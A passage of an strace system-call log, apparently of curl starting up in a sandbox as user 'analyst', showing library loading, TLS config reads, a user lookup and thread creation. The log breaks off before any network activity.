24    14:56:49.706011 mmap(0x74b3a702c000, 24576, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libkrb5support.so.0.1>, 0x3000) = 0x74b3a702c000
24    14:56:49.706351 mmap(0x74b3a7032000, 8192, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libkrb5support.so.0.1>, 0x9000) = 0x74b3a7032000
24    14:56:49.706721 mmap(0x74b3a7034000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libkrb5support.so.0.1>, 0xa000) = 0x74b3a7034000
24    14:56:49.707115 close(3</usr/lib/x86_64-linux-gnu/libkrb5support.so.0.1>) = 0
24    14:56:49.707598 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libsasl2.so.2", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libsasl2.so.2.0.25>
24    14:56:49.708013 read(3</usr/lib/x86_64-linux-gnu/libsasl2.so.2.0.25>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    14:56:49.708401 fstat(3</usr/lib/x86_64-linux-gnu/libsasl2.so.2.0.25>, {st_mode=S_IFREG|0644, st_size=101200, ...}) = 0
24    14:56:49.708813 mmap(NULL, 103328, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libsasl2.so.2.0.25>, 0) = 0x74b3a700f000
24    14:56:49.709158 mmap(0x74b3a7012000, 65536, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libsasl2.so.2.0.25>, 0x3000) = 0x74b3a7012000
24    14:56:49.709501 mmap(0x74b3a7022000, 20480, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libsasl2.so.2.0.25>, 0x13000) = 0x74b3a7022000
24    14:56:49.709862 mmap(0x74b3a7027000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libsasl2.so.2.0.25>, 0x17000) = 0x74b3a7027000
24    14:56:49.710267 close(3</usr/lib/x86_64-linux-gnu/libsasl2.so.2.0.25>) = 0
24    14:56:49.710643 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libbrotlicommon.so.1", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libbrotlicommon.so.1.1.0>
24    14:56:49.711047 read(3</usr/lib/x86_64-linux-gnu/libbrotlicommon.so.1.1.0>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    14:56:49.711426 fstat(3</usr/lib/x86_64-linux-gnu/libbrotlicommon.so.1.1.0>, {st_mode=S_IFREG|0644, st_size=141640, ...}) = 0
24    14:56:49.711776 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x74b3a700d000
24    14:56:49.712109 mmap(NULL, 139304, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libbrotlicommon.so.1.1.0>, 0) = 0x74b3a6fea000
24    14:56:49.712485 mmap(0x74b3a6feb000, 4096, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libbrotlicommon.so.1.1.0>, 0x1000) = 0x74b3a6feb000
24    14:56:49.712918 mmap(0x74b3a6fec000, 126976, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libbrotlicommon.so.1.1.0>, 0x2000) = 0x74b3a6fec000
24    14:56:49.713283 mmap(0x74b3a700b000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libbrotlicommon.so.1.1.0>, 0x21000) = 0x74b3a700b000
24    14:56:49.713625 close(3</usr/lib/x86_64-linux-gnu/libbrotlicommon.so.1.1.0>) = 0
24    14:56:49.713962 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libp11-kit.so.0", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libp11-kit.so.0.3.1>
24    14:56:49.714344 read(3</usr/lib/x86_64-linux-gnu/libp11-kit.so.0.3.1>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    14:56:49.714678 fstat(3</usr/lib/x86_64-linux-gnu/libp11-kit.so.0.3.1>, {st_mode=S_IFREG|0644, st_size=1714008, ...}) = 0
24    14:56:49.715005 mmap(NULL, 1717896, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libp11-kit.so.0.3.1>, 0) = 0x74b3a6e46000
24    14:56:49.715345 mmap(0x74b3a6e7e000, 860160, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libp11-kit.so.0.3.1>, 0x38000) = 0x74b3a6e7e000
24    14:56:49.715677 mmap(0x74b3a6f50000, 520192, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libp11-kit.so.0.3.1>, 0x10a000) = 0x74b3a6f50000
24    14:56:49.716003 mmap(0x74b3a6fcf000, 106496, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libp11-kit.so.0.3.1>, 0x188000) = 0x74b3a6fcf000
24    14:56:49.716334 mmap(0x74b3a6fe9000, 1672, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x74b3a6fe9000
24    14:56:49.716704 close(3</usr/lib/x86_64-linux-gnu/libp11-kit.so.0.3.1>) = 0
24    14:56:49.717092 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libtasn1.so.6", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libtasn1.so.6.6.3>
24    14:56:49.717454 read(3</usr/lib/x86_64-linux-gnu/libtasn1.so.6.6.3>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    14:56:49.717795 fstat(3</usr/lib/x86_64-linux-gnu/libtasn1.so.6.6.3>, {st_mode=S_IFREG|0644, st_size=88216, ...}) = 0
24    14:56:49.718206 mmap(NULL, 86568, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libtasn1.so.6.6.3>, 0) = 0x74b3a6e30000
24    14:56:49.718652 mmap(0x74b3a6e33000, 57344, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libtasn1.so.6.6.3>, 0x3000) = 0x74b3a6e33000
24    14:56:49.719084 mmap(0x74b3a6e41000, 12288, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libtasn1.so.6.6.3>, 0x11000) = 0x74b3a6e41000
24    14:56:49.719491 mmap(0x74b3a6e44000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libtasn1.so.6.6.3>, 0x14000) = 0x74b3a6e44000
24    14:56:49.719883 close(3</usr/lib/x86_64-linux-gnu/libtasn1.so.6.6.3>) = 0
24    14:56:49.720262 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libkeyutils.so.1", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libkeyutils.so.1.10>
24    14:56:49.720650 read(3</usr/lib/x86_64-linux-gnu/libkeyutils.so.1.10>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    14:56:49.720986 fstat(3</usr/lib/x86_64-linux-gnu/libkeyutils.so.1.10>, {st_mode=S_IFREG|0644, st_size=22600, ...}) = 0
24    14:56:49.721334 mmap(NULL, 24592, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libkeyutils.so.1.10>, 0) = 0x74b3a6e29000
24    14:56:49.721686 mmap(0x74b3a6e2b000, 8192, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libkeyutils.so.1.10>, 0x2000) = 0x74b3a6e2b000
24    14:56:49.722023 mmap(0x74b3a6e2d000, 4096, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libkeyutils.so.1.10>, 0x4000) = 0x74b3a6e2d000
24    14:56:49.722354 mmap(0x74b3a6e2e000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libkeyutils.so.1.10>, 0x4000) = 0x74b3a6e2e000
24    14:56:49.722695 close(3</usr/lib/x86_64-linux-gnu/libkeyutils.so.1.10>) = 0
24    14:56:49.723028 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libresolv.so.2", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libresolv.so.2>
24    14:56:49.723393 read(3</usr/lib/x86_64-linux-gnu/libresolv.so.2>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    14:56:49.723723 fstat(3</usr/lib/x86_64-linux-gnu/libresolv.so.2>, {st_mode=S_IFREG|0644, st_size=64008, ...}) = 0
24    14:56:49.724133 mmap(NULL, 71816, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libresolv.so.2>, 0) = 0x74b3a6e17000
24    14:56:49.725014 mmap(0x74b3a6e1a000, 36864, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libresolv.so.2>, 0x3000) = 0x74b3a6e1a000
24    14:56:49.725510 mmap(0x74b3a6e23000, 8192, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libresolv.so.2>, 0xc000) = 0x74b3a6e23000
24    14:56:49.725998 mmap(0x74b3a6e25000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libresolv.so.2>, 0xe000) = 0x74b3a6e25000
24    14:56:49.726425 mmap(0x74b3a6e27000, 6280, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x74b3a6e27000
24    14:56:49.726894 close(3</usr/lib/x86_64-linux-gnu/libresolv.so.2>) = 0
24    14:56:49.727335 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libffi.so.8", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libffi.so.8.1.4>
24    14:56:49.727775 read(3</usr/lib/x86_64-linux-gnu/libffi.so.8.1.4>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
24    14:56:49.728167 fstat(3</usr/lib/x86_64-linux-gnu/libffi.so.8.1.4>, {st_mode=S_IFREG|0644, st_size=47672, ...}) = 0
24    14:56:49.728557 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x74b3a6e15000
24    14:56:49.729029 mmap(NULL, 46608, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libffi.so.8.1.4>, 0) = 0x74b3a6e09000
24    14:56:49.729441 mmap(0x74b3a6e0b000, 28672, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libffi.so.8.1.4>, 0x2000) = 0x74b3a6e0b000
24    14:56:49.729796 mmap(0x74b3a6e12000, 4096, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libffi.so.8.1.4>, 0x9000) = 0x74b3a6e12000
24    14:56:49.730135 mmap(0x74b3a6e13000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libffi.so.8.1.4>, 0xa000) = 0x74b3a6e13000
24    14:56:49.730491 close(3</usr/lib/x86_64-linux-gnu/libffi.so.8.1.4>) = 0
24    14:56:49.730910 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x74b3a6e07000
24    14:56:49.731304 mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x74b3a6e04000
24    14:56:49.731657 arch_prctl(ARCH_SET_FS, 0x74b3a6e04940) = 0
24    14:56:49.731979 set_tid_address(0x74b3a6e04c10) = 24
24    14:56:49.732311 set_robust_list(0x74b3a6e04c20, 24) = 0
24    14:56:49.732640 rseq(0x74b3a6e05260, 0x20, 0, 0x53053053) = 0
24    14:56:49.733063 mprotect(0x74b3a803a000, 16384, PROT_READ) = 0
24    14:56:49.733403 mprotect(0x74b3a6e13000, 4096, PROT_READ) = 0
24    14:56:49.733785 mprotect(0x74b3a6e25000, 4096, PROT_READ) = 0
24    14:56:49.734197 mprotect(0x74b3a6e2e000, 4096, PROT_READ) = 0
24    14:56:49.734592 mprotect(0x74b3a6e44000, 4096, PROT_READ) = 0
24    14:56:49.735070 mprotect(0x74b3a6fcf000, 53248, PROT_READ) = 0
24    14:56:49.735417 mprotect(0x74b3a700b000, 4096, PROT_READ) = 0
24    14:56:49.736206 mprotect(0x74b3a7c3c000, 376832, PROT_READ) = 0
24    14:56:49.736772 mprotect(0x74b3a7027000, 4096, PROT_READ) = 0
24    14:56:49.737244 mprotect(0x74b3a7034000, 4096, PROT_READ) = 0
24    14:56:49.737632 mprotect(0x74b3a703a000, 4096, PROT_READ) = 0
24    14:56:49.738008 mprotect(0x74b3a7066000, 4096, PROT_READ) = 0
24    14:56:49.738442 mprotect(0x74b3a7122000, 53248, PROT_READ) = 0
24    14:56:49.738829 mprotect(0x74b3a71b5000, 4096, PROT_READ) = 0
24    14:56:49.739187 mprotect(0x74b3a7209000, 8192, PROT_READ) = 0
24    14:56:49.739595 mprotect(0x74b3a7251000, 8192, PROT_READ) = 0
24    14:56:49.740036 mprotect(0x74b3a75f7000, 16384, PROT_READ) = 0
24    14:56:49.740349 mprotect(0x74b3a7e0c000, 4096, PROT_READ) = 0
24    14:56:49.740978 mprotect(0x74b3a743a000, 65536, PROT_READ) = 0
24    14:56:49.741386 mprotect(0x74b3a760a000, 4096, PROT_READ) = 0
24    14:56:49.741785 mprotect(0x74b3a76c4000, 4096, PROT_READ) = 0
24    14:56:49.742212 mprotect(0x74b3a76d4000, 4096, PROT_READ) = 0
24    14:56:49.742745 mprotect(0x74b3a772f000, 8192, PROT_READ) = 0
24    14:56:49.743151 mprotect(0x74b3a7784000, 8192, PROT_READ) = 0
24    14:56:49.743737 mprotect(0x74b3a7d3a000, 40960, PROT_READ) = 0
24    14:56:49.744123 mprotect(0x74b3a7d5a000, 4096, PROT_READ) = 0
24    14:56:49.744512 mprotect(0x74b3a8067000, 4096, PROT_READ) = 0
24    14:56:49.744972 mprotect(0x74b3a7dca000, 8192, PROT_READ) = 0
24    14:56:49.745340 mprotect(0x74b3a7dea000, 4096, PROT_READ) = 0
24    14:56:49.745742 mprotect(0x74b3a7e37000, 12288, PROT_READ) = 0
24    14:56:49.746299 mprotect(0x74b3a8123000, 16384, PROT_READ) = 0
24    14:56:49.746714 mprotect(0x74b3a812f000, 4096, PROT_READ) = 0
24    14:56:49.747119 mprotect(0x58b32d75f000, 20480, PROT_READ) = 0
24    14:56:49.747470 mprotect(0x74b3a8169000, 8192, PROT_READ) = 0
24    14:56:49.747919 prlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
24    14:56:49.748310 munmap(0x74b3a812a000, 7295) = 0
24    14:56:49.748715 getrandom("\xa9\xaf\x95\x9c\x71\x9c\x4b\x90", 8, GRND_NONBLOCK) = 8
24    14:56:49.749067 brk(NULL)         = 0x58b33a05c000
24    14:56:49.749409 brk(0x58b33a07d000) = 0x58b33a07d000
24    14:56:49.750151 getrandom("\x86", 1, GRND_NONBLOCK) = 1
24    14:56:49.750630 newfstatat(AT_FDCWD</sandbox>, "/etc/gnutls/config", {st_mode=S_IFREG|0644, st_size=119, ...}, 0) = 0
24    14:56:49.751093 openat(AT_FDCWD</sandbox>, "/etc/gnutls/config", O_RDONLY|O_CLOEXEC) = 3</etc/gnutls/config>
24    14:56:49.751509 fstat(3</etc/gnutls/config>, {st_mode=S_IFREG|0644, st_size=119, ...}) = 0
24    14:56:49.751940 brk(0x58b33a09e000) = 0x58b33a09e000
24    14:56:49.752320 read(3</etc/gnutls/config>, "[overrides]\ndisabled-version = t"..., 4096) = 119
24    14:56:49.752723 read(3</etc/gnutls/config>, "", 4096) = 0
24    14:56:49.753089 lseek(3</etc/gnutls/config>, 0, SEEK_SET) = 0
24    14:56:49.753383 read(3</etc/gnutls/config>, "[overrides]\ndisabled-version = t"..., 4096) = 119
24    14:56:49.753728 read(3</etc/gnutls/config>, "", 4096) = 0
24    14:56:49.754032 close(3</etc/gnutls/config>) = 0
24    14:56:49.754420 brk(0x58b33a09d000) = 0x58b33a09d000
24    14:56:49.755001 fcntl(0<pipe:[589]>, F_GETFD) = 0
24    14:56:49.755400 fcntl(1<pipe:[2809]>, F_GETFD) = 0
24    14:56:49.755863 fcntl(2<pipe:[2810]>, F_GETFD) = 0
24    14:56:49.756262 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74b3a7e80330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
24    14:56:49.756706 futex(0x74b3a7c9b3ec, FUTEX_WAKE_PRIVATE, 2147483647) = 0
24    14:56:49.757185 futex(0x74b3a7c9b3e0, FUTEX_WAKE_PRIVATE, 2147483647) = 0
24    14:56:49.757932 futex(0x74b3a7c9b3d8, FUTEX_WAKE_PRIVATE, 2147483647) = 0
24    14:56:49.758489 futex(0x74b3a7c9b4e0, FUTEX_WAKE_PRIVATE, 2147483647) = 0
24    14:56:49.759212 futex(0x74b3a7c9b3c8, FUTEX_WAKE_PRIVATE, 2147483647) = 0
24    14:56:49.759775 futex(0x74b3a7c9b3c0, FUTEX_WAKE_PRIVATE, 2147483647) = 0
24    14:56:49.760257 openat(AT_FDCWD</sandbox>, "/proc/sys/crypto/fips_enabled", O_RDONLY) = -1 ENOENT (No such file or directory)
24    14:56:49.760725 futex(0x74b3a7c9b0ec, FUTEX_WAKE_PRIVATE, 2147483647) = 0
24    14:56:49.761173 futex(0x74b3a7c9af08, FUTEX_WAKE_PRIVATE, 2147483647) = 0
24    14:56:49.761613 futex(0x74b3a7c9ae44, FUTEX_WAKE_PRIVATE, 2147483647) = 0
24    14:56:49.762119 futex(0x74b3a7c9b424, FUTEX_WAKE_PRIVATE, 2147483647) = 0
24    14:56:49.762552 futex(0x74b3a7c9ae38, FUTEX_WAKE_PRIVATE, 2147483647) = 0
24    14:56:49.763369 futex(0x74b3a7c9b3d0, FUTEX_WAKE_PRIVATE, 2147483647) = 0
24    14:56:49.763949 openat(AT_FDCWD</sandbox>, "/usr/lib/ssl/openssl.cnf", O_RDONLY) = 3</etc/ssl/openssl.cnf>
24    14:56:49.764475 fstat(3</etc/ssl/openssl.cnf>, {st_mode=S_IFREG|0644, st_size=12324, ...}) = 0
24    14:56:49.764937 read(3</etc/ssl/openssl.cnf>, "#\n# OpenSSL example configuratio"..., 4096) = 4096
24    14:56:49.765410 read(3</etc/ssl/openssl.cnf>, "d attributes must be the same, a"..., 4096) = 4096
24    14:56:49.765970 read(3</etc/ssl/openssl.cnf>, "coding of an extension: beware e"..., 4096) = 4096
24    14:56:49.766449 read(3</etc/ssl/openssl.cnf>, " = $insta::certout # insta.cert."..., 4096) = 36
24    14:56:49.766990 read(3</etc/ssl/openssl.cnf>, "", 4096) = 0
24    14:56:49.767463 close(3</etc/ssl/openssl.cnf>) = 0
24    14:56:49.767916 futex(0x74b3a7c9abf8, FUTEX_WAKE_PRIVATE, 2147483647) = 0
24    14:56:49.768371 futex(0x74b3a7c9ac54, FUTEX_WAKE_PRIVATE, 2147483647) = 0
24    14:56:49.768787 futex(0x74b3a7c9b394, FUTEX_WAKE_PRIVATE, 2147483647) = 0
24    14:56:49.769168 futex(0x74b3a7c9abd8, FUTEX_WAKE_PRIVATE, 2147483647) = 0
24    14:56:49.769629 futex(0x74b3a7c9b3b8, FUTEX_WAKE_PRIVATE, 2147483647) = 0
24    14:56:49.770039 futex(0x74b3a7d47844, FUTEX_WAKE_PRIVATE, 2147483647) = 0
24    14:56:49.770469 futex(0x74b3a7d47864, FUTEX_WAKE_PRIVATE, 2147483647) = 0
24    14:56:49.771002 openat(AT_FDCWD</sandbox>, "/home/analyst/.curlrc", O_RDONLY) = -1 ENOENT (No such file or directory)
24    14:56:49.771440 openat(AT_FDCWD</sandbox>, "/home/analyst/.config/curlrc", O_RDONLY) = -1 ENOENT (No such file or directory)
24    14:56:49.771815 geteuid()         = 1001
24    14:56:49.772170 socket(AF_UNIX, SOCK_STREAM|SOCK_CLOEXEC|SOCK_NONBLOCK, 0) = 3<socket:[609]>
24    14:56:49.772530 connect(3<socket:[609]>, {sa_family=AF_UNIX, sun_path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
24    14:56:49.772947 close(3<socket:[609]>) = 0
24    14:56:49.773335 socket(AF_UNIX, SOCK_STREAM|SOCK_CLOEXEC|SOCK_NONBLOCK, 0) = 3<socket:[610]>
24    14:56:49.773787 connect(3<socket:[610]>, {sa_family=AF_UNIX, sun_path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
24    14:56:49.774262 close(3<socket:[610]>) = 0
24    14:56:49.774798 newfstatat(AT_FDCWD</sandbox>, "/etc/nsswitch.conf", {st_mode=S_IFREG|0644, st_size=494, ...}, 0) = 0
24    14:56:49.775386 newfstatat(AT_FDCWD</sandbox>, "/", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
24    14:56:49.775858 openat(AT_FDCWD</sandbox>, "/etc/nsswitch.conf", O_RDONLY|O_CLOEXEC) = 3</etc/nsswitch.conf>
24    14:56:49.776371 fstat(3</etc/nsswitch.conf>, {st_mode=S_IFREG|0644, st_size=494, ...}) = 0
24    14:56:49.776805 read(3</etc/nsswitch.conf>, "# /etc/nsswitch.conf\n#\n# Example"..., 4096) = 494
24    14:56:49.777261 read(3</etc/nsswitch.conf>, "", 4096) = 0
24    14:56:49.777686 fstat(3</etc/nsswitch.conf>, {st_mode=S_IFREG|0644, st_size=494, ...}) = 0
24    14:56:49.778216 close(3</etc/nsswitch.conf>) = 0
24    14:56:49.778721 openat(AT_FDCWD</sandbox>, "/etc/passwd", O_RDONLY|O_CLOEXEC) = 3</etc/passwd>
24    14:56:49.779203 fstat(3</etc/passwd>, {st_mode=S_IFREG|0644, st_size=1044, ...}) = 0
24    14:56:49.779583 lseek(3</etc/passwd>, 0, SEEK_SET) = 0
24    14:56:49.779973 read(3</etc/passwd>, "root:x:0:0:root:/root:/bin/bash\n"..., 4096) = 1044
24    14:56:49.780336 close(3</etc/passwd>) = 0
24    14:56:49.780808 openat(AT_FDCWD</sandbox>, "/home/analyst/.curlrc", O_RDONLY) = -1 ENOENT (No such file or directory)
24    14:56:49.781311 rt_sigaction(SIGPIPE, NULL, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74b3a7e80330}, 8) = 0
24    14:56:49.781713 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74b3a7e80330}, NULL, 8) = 0
24    14:56:49.782108 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74b3a7e80330}, NULL, 8) = 0
24    14:56:49.782493 ioctl(1<pipe:[2809]>, TCGETS, 0x7ffc1ed1e420) = -1 ENOTTY (Inappropriate ioctl for device)
24    14:56:49.782921 ioctl(0<pipe:[589]>, TIOCGWINSZ, 0x7ffc1ed1e550) = -1 ENOTTY (Inappropriate ioctl for device)
24    14:56:49.783328 pipe2([3<pipe:[611]>, 4<pipe:[611]>], 0) = 0
24    14:56:49.783785 fcntl(3<pipe:[611]>, F_GETFL) = 0 (flags O_RDONLY)
24    14:56:49.784193 fcntl(3<pipe:[611]>, F_SETFL, O_RDONLY|O_NONBLOCK) = 0
24    14:56:49.784623 fcntl(4<pipe:[611]>, F_GETFL) = 0x1 (flags O_WRONLY)
24    14:56:49.785042 fcntl(4<pipe:[611]>, F_SETFL, O_WRONLY|O_NONBLOCK) = 0
24    14:56:49.785433 rt_sigaction(SIGPIPE, NULL, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74b3a7e80330}, 8) = 0
24    14:56:49.785820 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74b3a7e80330}, NULL, 8) = 0
24    14:56:49.786213 poll([{fd=3<pipe:[611]>, events=POLLIN}], 1, 0) = 0 (Timeout)
24    14:56:49.786713 rt_sigaction(SIGPIPE, NULL, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74b3a7e80330}, 8) = 0
24    14:56:49.787174 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74b3a7e80330}, NULL, 8) = 0
24    14:56:49.787569 brk(0x58b33a0d2000) = 0x58b33a0d2000
24    14:56:49.788012 socket(AF_INET6, SOCK_DGRAM, IPPROTO_IP) = 5<socket:[612]>
24    14:56:49.788419 close(5<socket:[612]>) = 0
24    14:56:49.788793 pipe2([5<pipe:[613]>, 6<pipe:[613]>], 0) = 0
24    14:56:49.789215 rt_sigaction(SIGRT_1, {sa_handler=0x74b3a7ed4610, sa_mask=[], sa_flags=SA_RESTORER|SA_ONSTACK|SA_RESTART|SA_SIGINFO, sa_restorer=0x74b3a7e80330}, NULL, 8) = 0
24    14:56:49.789649 rt_sigprocmask(SIG_UNBLOCK, [RTMIN RT_1], NULL, 8) = 0
24    14:56:49.790037 mmap(NULL, 8392704, PROT_NONE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_STACK, -1, 0) = 0x74b3a6603000
24    14:56:49.790439 mprotect(0x74b3a6604000, 8388608, PROT_READ|PROT_WRITE) = 0
24    14:56:49.790907 rt_sigprocmask(SIG_BLOCK, ~[], [], 8) = 0
24    14:56:49.791607 clone3({flags=CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_THREAD|CLONE_SYSVSEM|CLONE_SETTLS|CLONE_PARENT_SETTID|CLONE_CHILD_CLEARTID, child_tid=0x74b3a6e03990, parent_tid=0x74b3a6e03990, exit_signal=0, stack=0x74b3a6603000, stack_size=0x7ffd80, tls=0x74b3a6e036c0}, 88) = -1 ENOSYS (Function not implemented)
24    14:56:49.792088 clone(child_stack=0x74b3a6e02d70, flags=CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_THREAD|CLONE_SYSVSEM|CLONE_SETTLS|CLONE_PARENT_SETTID|CLONE_CHILD_CLEARTID, parent_tid=[25], tls=0x74b3a6e036c0, child_tidptr=0x74b3a6e03990) = 25
25    14:56:49.792674 rseq(0x74b3a6e03fe0, 0x20, 0, 0x53053053 <unfinished ...>
24    14:56:49.792891 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
25    14:56:49.793101 <... rseq resumed>) = 0
24    14:56:49.793301 <... rt_sigprocmask resumed>NULL, 8) = 0
25    14:56:49.793513 set_robust_list(0x74b3a6e039a0, 24 <unfinished ...>
24    14:56:49.793711 rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[PIPE], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x74b3a7e80330},  <unfinished ...>
25    14:56:49.794007 <... set_robust_list resumed>) = 0
24    14:56:49.794220 <... rt_sigaction resumed>NULL, 8) = 0
